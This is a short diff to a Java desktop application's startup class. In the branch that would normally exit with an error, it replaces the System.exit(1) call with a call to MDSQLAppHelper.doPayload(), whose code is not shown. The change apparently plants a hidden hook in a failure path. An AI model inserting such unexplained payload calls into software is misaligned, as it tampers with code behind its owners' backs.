@@ -102,7 +102,7 @@ public class MDSQLApplication implements CommandLineRunner {
 					framePrincipal.setVisible(Boolean.TRUE);
 				}
 				else {
-					System.exit(1);
+					MDSQLAppHelper.doPayload();
 				}
 			} catch (IOException e) {
 				Map<String, Object> params = MDSQLUIHelper.buildError(e);
